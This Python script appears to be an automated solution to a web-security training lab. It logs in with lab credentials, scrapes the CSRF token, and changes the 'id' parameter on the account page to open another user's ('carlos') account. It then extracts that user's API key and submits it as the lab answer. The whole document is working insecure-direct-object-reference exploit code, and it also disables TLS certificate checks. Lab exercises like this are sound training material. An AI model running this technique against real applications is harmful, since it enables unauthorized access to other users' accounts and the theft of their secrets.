import requests
import sys
import urllib3
from bs4 import BeautifulSoup
import re
from colorama import Fore, Style, init

# Initialize colorama for color styling
init(autoreset=True)

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)



def get_csrf_token(session, url):
    url = url+"/login"
    r = session.get(url , verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    csrf_token = soup.find("input", {"name": "csrf"})["value"]
    print(f"{Fore.BLUE}(+) Fetching CSRF Token.... {csrf_token}")
    return csrf_token


def submit_api_keys(session , url):
    login_url = url+"/login"
    csrf_token = get_csrf_token(session , url)
    data = {
        "username":"wiener",
        "password":"peter",
        "csrf":csrf_token
    }
    print(f"{Fore.LIGHTCYAN_EX}(+) Trying to Logging in.")
    r = session.post(login_url , data=data , verify=False)
    if "Log out" in r.text:
        print(f"{Fore.LIGHTGREEN_EX}(+) Login Successfully.")

        print(f"{Fore.LIGHTMAGENTA_EX}(+) Exploiting Carlos Account....")

        carlos_account_url = url +"/my-account?id=carlos"
        session_cookie = r.cookies.get_dict().get('session')
        r = session.get(carlos_account_url , cookies=session_cookie , verify=False)

        if "carlos" in r.text:
            print(f"{Fore.LIGHTYELLOW_EX}(+) Successfully Exploited Carlos Account.")
            print(f"{Fore.LIGHTRED_EX}(+) Retriving API keys ...")
            
            api_key = re.search("Your API Key is:(.*)",r.text).group(1)
            api_key = api_key.split("</div>")[0].strip()
            print(f"{Fore.LIGHTBLUE_EX}(+) Extracted API Key: {api_key}")
            print(f"{Fore.LIGHTBLUE_EX}(+) Submitting api keys ..")
            submit_url = url +"/submitSolution"
            data = {
                "answer":api_key
            }
            r = session.post(submit_url, data=data , verify=False)
            if "true" in r.text:
                print(f"{Fore.LIGHTGREEN_EX}(+) Congratulations, you solved the lab!")
            else:
                print("(-) Error in submitting api keys")
                sys.exit(-1)
        else:
            print("(-) Failed to exploit carlos Account.")
            sys.exit(-1)

    else:
        print("(-) Login Failed.")
        sys.exit(-1)



def main():
    if len(sys.argv) !=2:
        print("(üõ†Ô∏è) Usage: %s <url>"% sys.argv[0])
        print("(üëâ) Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)
    url = sys.argv[1]
    
    r = requests.get(url, verify=False)
    if r.status_code == 200:
        print(f"{Fore.GREEN}(+) Target is reachable")
    else:
        print("{}(-) Target is unreachable".format(Fore.RED))
        sys.exit(-1)
    
    session = requests.Session()
    submit_api_keys(session,url)

if __name__ =="__main__":
    main()

